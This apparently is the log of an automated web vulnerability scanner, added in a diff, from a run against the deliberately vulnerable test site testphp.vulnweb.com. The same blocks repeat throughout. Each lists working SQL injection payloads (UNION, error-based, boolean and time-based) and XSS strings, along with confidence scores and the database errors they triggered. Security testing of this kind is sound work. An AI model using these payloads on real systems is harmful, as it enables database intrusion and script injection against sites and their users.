+Advanced_payload: '/**/or/**/sleep(5)/**/--/**/-
+Advanced_Confidence: 100
+Detail_Vuln: Boolean-Based SQL Injection
+Advanced_payload: '); or 1=1 -- -
+Advanced_Confidence: 100
+Detail_Vuln: Boolean-Based SQL Injection
+Advanced_payload: ' OR (SELECT CASE WHEN (1=1) THEN 'true' ELSE 'false' END) = 'true'--
+Advanced_Confidence: 100
+Detail_Vuln: Boolean-Based SQL Injection
+Advanced_payload: ' AND IIF(1=1,1,0)--
+Advanced_Confidence: 100
+------------------------------------------------------------------
+
+handler: common, advanced
+url: http://testphp.vulnweb.com/listproducts.php
+parameters: ['test', 'searchFor']
+method: GET
+Type: xss
+Detected: True
+Common_payload: <img src=x onerror='javascript:alert(6)'>
+Common_Confidence: 70
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' UNION SELECT NULL-- -
+Advanced_Confidence: 100
+Context: ECT NULL-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' ORDER BY -1-- -
+Advanced_Confidence: 100
+Context: ER BY -1-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' AND updatexml(NULL, concat(char(126),version()), char(126))-- -
+Advanced_Confidence: 100
+Context: ar(126))-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' AND extractvalue(rand(),concat(char(126),version(),char(126)))-- -
+Advanced_Confidence: 100
+Context: r(126)))-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' AND (SELECT * FROM (SELECT NAME_CONST(version(),1),NAME_CONST(version(),1)) as x)-- -
+Advanced_Confidence: 100
+Context: )) as x)-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' AND cast(version() as integer) > 0-- -
+Advanced_Confidence: 100
+Context: ger) > 0-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' AND 1=cast(chr(126)||version()||chr(126) AS NUMERIC)-- -
+Advanced_Confidence: 100
+Context: NUMERIC)-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' UNION SELECT sqlite_version()-- -
+Advanced_Confidence: 100
+Context: ersion()-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' AND 1=convert(int,@@version)-- -
+Advanced_Confidence: 100
+Context: version)-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' AND 1=cast((SELECT @@version) as int)-- -
+Advanced_Confidence: 100
+Context:  as int)-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' + convert(int,@@version) + '
+Advanced_Confidence: 100
+Context: version) + '</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' UNION SELECT NULL FROM DUAL-- -
+Advanced_Confidence: 100
+Context: ROM DUAL-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Time-Based SQL Injection
+Advanced_payload: '/**/or/**/sleep(5)/**/--/**/-
+Advanced_Confidence: 100
+Detail_Vuln: Boolean-Based SQL Injection
+Advanced_payload: '); or 1=1 -- -
+Advanced_Confidence: 100
+Detail_Vuln: Boolean-Based SQL Injection
+Advanced_payload: ' OR (SELECT CASE WHEN (1=1) THEN 'true' ELSE 'false' END) = 'true'--
+Advanced_Confidence: 100
+Detail_Vuln: Boolean-Based SQL Injection
+Advanced_payload: ' AND IIF(1=1,1,0)--
+Advanced_Confidence: 100
+------------------------------------------------------------------
+
+handler: common, advanced
+url: http://testphp.vulnweb.com/listproducts.php
+parameters: ['test', 'searchFor']
+method: GET
+Type: sql_injection
+Detected: True
+Common_payload: <img src='a' alt="test" onload=javascript%3Aalert`6`>
+Common_Confidence: 70
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' UNION SELECT NULL-- -
+Advanced_Confidence: 100
+Context: ECT NULL-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' ORDER BY -1-- -
+Advanced_Confidence: 100
+Context: ER BY -1-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' AND updatexml(NULL, concat(char(126),version()), char(126))-- -
+Advanced_Confidence: 100
+Context: ar(126))-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' AND extractvalue(rand(),concat(char(126),version(),char(126)))-- -
+Advanced_Confidence: 100
+Context: r(126)))-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' AND (SELECT * FROM (SELECT NAME_CONST(version(),1),NAME_CONST(version(),1)) as x)-- -
+Advanced_Confidence: 100
+Context: )) as x)-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' AND cast(version() as integer) > 0-- -
+Advanced_Confidence: 100
+Context: ger) > 0-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' AND 1=cast(chr(126)||version()||chr(126) AS NUMERIC)-- -
+Advanced_Confidence: 100
+Context: NUMERIC)-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' UNION SELECT sqlite_version()-- -
+Advanced_Confidence: 100
+Context: ersion()-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' AND 1=convert(int,@@version)-- -
+Advanced_Confidence: 100
+Context: version)-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' AND 1=cast((SELECT @@version) as int)-- -
+Advanced_Confidence: 100
+Context:  as int)-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' + convert(int,@@version) + '
+Advanced_Confidence: 100
+Context: version) + '</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' UNION SELECT NULL FROM DUAL-- -
+Advanced_Confidence: 100
+Context: ROM DUAL-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Time-Based SQL Injection
+Advanced_payload: '/**/or/**/sleep(5)/**/--/**/-
+Advanced_Confidence: 100
+Detail_Vuln: Boolean-Based SQL Injection
+Advanced_payload: '); or 1=1 -- -
+Advanced_Confidence: 100
+Detail_Vuln: Boolean-Based SQL Injection
+Advanced_payload: ' OR (SELECT CASE WHEN (1=1) THEN 'true' ELSE 'false' END) = 'true'--
+Advanced_Confidence: 100
+Detail_Vuln: Boolean-Based SQL Injection
+Advanced_payload: ' AND IIF(1=1,1,0)--
+Advanced_Confidence: 100
+------------------------------------------------------------------
+
+handler: common, advanced
+url: http://testphp.vulnweb.com/listproducts.php
+parameters: ['test', 'searchFor']
+method: GET
+Type: sql_injection
+Detected: True
+Common_payload: /**/a';${1234**3};'--%20-
+Common_Confidence: 70
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' UNION SELECT NULL-- -
+Advanced_Confidence: 100
+Context: ECT NULL-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' ORDER BY -1-- -
+Advanced_Confidence: 100
+Context: ER BY -1-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' AND updatexml(NULL, concat(char(126),version()), char(126))-- -
+Advanced_Confidence: 100
+Context: ar(126))-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' AND extractvalue(rand(),concat(char(126),version(),char(126)))-- -
+Advanced_Confidence: 100
+Context: r(126)))-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' AND (SELECT * FROM (SELECT NAME_CONST(version(),1),NAME_CONST(version(),1)) as x)-- -
+Advanced_Confidence: 100
+Context: )) as x)-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' AND cast(version() as integer) > 0-- -
+Advanced_Confidence: 100
+Context: ger) > 0-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' AND 1=cast(chr(126)||version()||chr(126) AS NUMERIC)-- -
+Advanced_Confidence: 100
+Context: NUMERIC)-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' UNION SELECT sqlite_version()-- -
+Advanced_Confidence: 100
+Context: ersion()-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' AND 1=convert(int,@@version)-- -
+Advanced_Confidence: 100
+Context: version)-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' AND 1=cast((SELECT @@version) as int)-- -
+Advanced_Confidence: 100
+Context:  as int)-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' + convert(int,@@version) + '
+Advanced_Confidence: 100
+Context: version) + '</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' UNION SELECT NULL FROM DUAL-- -
+Advanced_Confidence: 100
+Context: ROM DUAL-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Time-Based SQL Injection
+Advanced_payload: '/**/or/**/sleep(5)/**/--/**/-
+Advanced_Confidence: 100
+Detail_Vuln: Boolean-Based SQL Injection
+Advanced_payload: '); or 1=1 -- -
+Advanced_Confidence: 100
+Detail_Vuln: Boolean-Based SQL Injection
+Advanced_payload: ' OR (SELECT CASE WHEN (1=1) THEN 'true' ELSE 'false' END) = 'true'--
+Advanced_Confidence: 100
+Detail_Vuln: Boolean-Based SQL Injection
+Advanced_payload: ' AND IIF(1=1,1,0)--
+Advanced_Confidence: 100
+------------------------------------------------------------------
+
+handler: common, advanced
+url: http://testphp.vulnweb.com/listproducts.php
+parameters: ['test', 'searchFor']
+method: GET
+Type: xss
+Detected: True
+Common_payload: /*!SLEEP(5)/*/alert(1)/*/*/
+Common_Confidence: 50
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' UNION SELECT NULL-- -
+Advanced_Confidence: 100
+Context: ECT NULL-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' ORDER BY -1-- -
+Advanced_Confidence: 100
+Context: ER BY -1-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' AND updatexml(NULL, concat(char(126),version()), char(126))-- -
+Advanced_Confidence: 100
+Context: ar(126))-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' AND extractvalue(rand(),concat(char(126),version(),char(126)))-- -
+Advanced_Confidence: 100
+Context: r(126)))-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' AND (SELECT * FROM (SELECT NAME_CONST(version(),1),NAME_CONST(version(),1)) as x)-- -
+Advanced_Confidence: 100
+Context: )) as x)-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' AND cast(version() as integer) > 0-- -
+Advanced_Confidence: 100
+Context: ger) > 0-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' AND 1=cast(chr(126)||version()||chr(126) AS NUMERIC)-- -
+Advanced_Confidence: 100
+Context: NUMERIC)-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' UNION SELECT sqlite_version()-- -
+Advanced_Confidence: 100
+Context: ersion()-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' AND 1=convert(int,@@version)-- -
+Advanced_Confidence: 100
+Context: version)-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' AND 1=cast((SELECT @@version) as int)-- -
+Advanced_Confidence: 100
+Context:  as int)-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' + convert(int,@@version) + '
+Advanced_Confidence: 100
+Context: version) + '</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' UNION SELECT NULL FROM DUAL-- -
+Advanced_Confidence: 100
+Context: ROM DUAL-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Time-Based SQL Injection
+Advanced_payload: '/**/or/**/sleep(5)/**/--/**/-
+Advanced_Confidence: 100
+Detail_Vuln: Boolean-Based SQL Injection
+Advanced_payload: '); or 1=1 -- -
+Advanced_Confidence: 100
+Detail_Vuln: Boolean-Based SQL Injection
+Advanced_payload: ' OR (SELECT CASE WHEN (1=1) THEN 'true' ELSE 'false' END) = 'true'--
+Advanced_Confidence: 100
+Detail_Vuln: Boolean-Based SQL Injection
+Advanced_payload: ' AND IIF(1=1,1,0)--
+Advanced_Confidence: 100
+------------------------------------------------------------------
+
+handler: common, advanced
+url: http://testphp.vulnweb.com/listproducts.php
+parameters: ['test', 'searchFor']
+method: GET
+Type: sql_injection
+Detected: True
+Common_payload: '"<script>#{1234**3};alert(1)</script><img src=x onerror=alert(2)><!--
+Common_Confidence: 70
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' UNION SELECT NULL-- -
+Advanced_Confidence: 100
+Context: ECT NULL-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' ORDER BY -1-- -
+Advanced_Confidence: 100
+Context: ER BY -1-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' AND updatexml(NULL, concat(char(126),version()), char(126))-- -
+Advanced_Confidence: 100
+Context: ar(126))-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' AND extractvalue(rand(),concat(char(126),version(),char(126)))-- -
+Advanced_Confidence: 100
+Context: r(126)))-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' AND (SELECT * FROM (SELECT NAME_CONST(version(),1),NAME_CONST(version(),1)) as x)-- -
+Advanced_Confidence: 100
+Context: )) as x)-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' AND cast(version() as integer) > 0-- -
+Advanced_Confidence: 100
+Context: ger) > 0-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' AND 1=cast(chr(126)||version()||chr(126) AS NUMERIC)-- -
+Advanced_Confidence: 100
+Context: NUMERIC)-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' UNION SELECT sqlite_version()-- -
+Advanced_Confidence: 100
+Context: ersion()-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' AND 1=convert(int,@@version)-- -
+Advanced_Confidence: 100
+Context: version)-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' AND 1=cast((SELECT @@version) as int)-- -
+Advanced_Confidence: 100
+Context:  as int)-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' + convert(int,@@version) + '
+Advanced_Confidence: 100
+Context: version) + '</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' UNION SELECT NULL FROM DUAL-- -
+Advanced_Confidence: 100
+Context: ROM DUAL-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Time-Based SQL Injection
+Advanced_payload: '/**/or/**/sleep(5)/**/--/**/-
+Advanced_Confidence: 100
+Detail_Vuln: Boolean-Based SQL Injection
+Advanced_payload: '); or 1=1 -- -
+Advanced_Confidence: 100
+Detail_Vuln: Boolean-Based SQL Injection
+Advanced_payload: ' OR (SELECT CASE WHEN (1=1) THEN 'true' ELSE 'false' END) = 'true'--
+Advanced_Confidence: 100
+Detail_Vuln: Boolean-Based SQL Injection
+Advanced_payload: ' AND IIF(1=1,1,0)--
+Advanced_Confidence: 100
+------------------------------------------------------------------
+
+handler: common, advanced
+url: http://testphp.vulnweb.com/listproducts.php
+parameters: ['test', 'searchFor']
+method: GET
+Type: xss
+Detected: True
+Common_payload: '"<script>#{1234**3};alert(1)</script><img src=x onerror=alert(2)><!--
+Common_Confidence: 70
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' UNION SELECT NULL-- -
+Advanced_Confidence: 100
+Context: ECT NULL-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' ORDER BY -1-- -
+Advanced_Confidence: 100
+Context: ER BY -1-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' AND updatexml(NULL, concat(char(126),version()), char(126))-- -
+Advanced_Confidence: 100
+Context: ar(126))-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' AND extractvalue(rand(),concat(char(126),version(),char(126)))-- -
+Advanced_Confidence: 100
+Context: r(126)))-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' AND (SELECT * FROM (SELECT NAME_CONST(version(),1),NAME_CONST(version(),1)) as x)-- -
+Advanced_Confidence: 100
+Context: )) as x)-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' AND cast(version() as integer) > 0-- -
+Advanced_Confidence: 100
+Context: ger) > 0-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' AND 1=cast(chr(126)||version()||chr(126) AS NUMERIC)-- -
+Advanced_Confidence: 100
+Context: NUMERIC)-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' UNION SELECT sqlite_version()-- -
+Advanced_Confidence: 100
+Context: ersion()-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' AND 1=convert(int,@@version)-- -
+Advanced_Confidence: 100
+Context: version)-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' AND 1=cast((SELECT @@version) as int)-- -
+Advanced_Confidence: 100
+Context:  as int)-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' + convert(int,@@version) + '
+Advanced_Confidence: 100
+Context: version) + '</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' UNION SELECT NULL FROM DUAL-- -
+Advanced_Confidence: 100
+Context: ROM DUAL-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Time-Based SQL Injection
+Advanced_payload: '/**/or/**/sleep(5)/**/--/**/-
+Advanced_Confidence: 100
+Detail_Vuln: Boolean-Based SQL Injection
+Advanced_payload: '); or 1=1 -- -
+Advanced_Confidence: 100
+Detail_Vuln: Boolean-Based SQL Injection
+Advanced_payload: ' OR (SELECT CASE WHEN (1=1) THEN 'true' ELSE 'false' END) = 'true'--
+Advanced_Confidence: 100
+Detail_Vuln: Boolean-Based SQL Injection
+Advanced_payload: ' AND IIF(1=1,1,0)--
+Advanced_Confidence: 100
+------------------------------------------------------------------
+
+handler: common, advanced
+url: http://testphp.vulnweb.com/listproducts.php
+parameters: ['test', 'searchFor']
+method: GET
+Type: xss
+Detected: True
+Common_payload: '"<script>#{1234**3};alert(1)</script><img src=x onerror=alert(2)><!--
+Common_Confidence: 50
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' UNION SELECT NULL-- -
+Advanced_Confidence: 100
+Context: ECT NULL-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' ORDER BY -1-- -
+Advanced_Confidence: 100
+Context: ER BY -1-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' AND updatexml(NULL, concat(char(126),version()), char(126))-- -
+Advanced_Confidence: 100
+Context: ar(126))-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' AND extractvalue(rand(),concat(char(126),version(),char(126)))-- -
+Advanced_Confidence: 100
+Context: r(126)))-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' AND (SELECT * FROM (SELECT NAME_CONST(version(),1),NAME_CONST(version(),1)) as x)-- -
+Advanced_Confidence: 100
+Context: )) as x)-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' AND cast(version() as integer) > 0-- -
+Advanced_Confidence: 100
+Context: ger) > 0-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' AND 1=cast(chr(126)||version()||chr(126) AS NUMERIC)-- -
+Advanced_Confidence: 100
+Context: NUMERIC)-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' UNION SELECT sqlite_version()-- -
+Advanced_Confidence: 100
+Context: ersion()-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' AND 1=convert(int,@@version)-- -
+Advanced_Confidence: 100
+Context: version)-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' AND 1=cast((SELECT @@version) as int)-- -
+Advanced_Confidence: 100
+Context:  as int)-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' + convert(int,@@version) + '
+Advanced_Confidence: 100
+Context: version) + '</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' UNION SELECT NULL FROM DUAL-- -
+Advanced_Confidence: 100
+Context: ROM DUAL-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Time-Based SQL Injection
+Advanced_payload: '/**/or/**/sleep(5)/**/--/**/-
+Advanced_Confidence: 100
+Detail_Vuln: Boolean-Based SQL Injection
+Advanced_payload: '); or 1=1 -- -
+Advanced_Confidence: 100
+Detail_Vuln: Boolean-Based SQL Injection
+Advanced_payload: ' OR (SELECT CASE WHEN (1=1) THEN 'true' ELSE 'false' END) = 'true'--
+Advanced_Confidence: 100
+Detail_Vuln: Boolean-Based SQL Injection
+Advanced_payload: ' AND IIF(1=1,1,0)--
+Advanced_Confidence: 100
+------------------------------------------------------------------
+
+handler: common, advanced
+url: http://testphp.vulnweb.com/listproducts.php
+parameters: ['test', 'searchFor']
+method: GET
+Type: sql_injection
+Detected: True
+Common_payload: " onclick=alert(1)//<button ' onclick=alert(1)//> */ alert(1)//
+Common_Confidence: 70
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' UNION SELECT NULL-- -
+Advanced_Confidence: 100
+Context: ECT NULL-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' ORDER BY -1-- -
+Advanced_Confidence: 100
+Context: ER BY -1-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' AND updatexml(NULL, concat(char(126),version()), char(126))-- -
+Advanced_Confidence: 100
+Context: ar(126))-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' AND extractvalue(rand(),concat(char(126),version(),char(126)))-- -
+Advanced_Confidence: 100
+Context: r(126)))-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' AND (SELECT * FROM (SELECT NAME_CONST(version(),1),NAME_CONST(version(),1)) as x)-- -
+Advanced_Confidence: 100
+Context: )) as x)-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
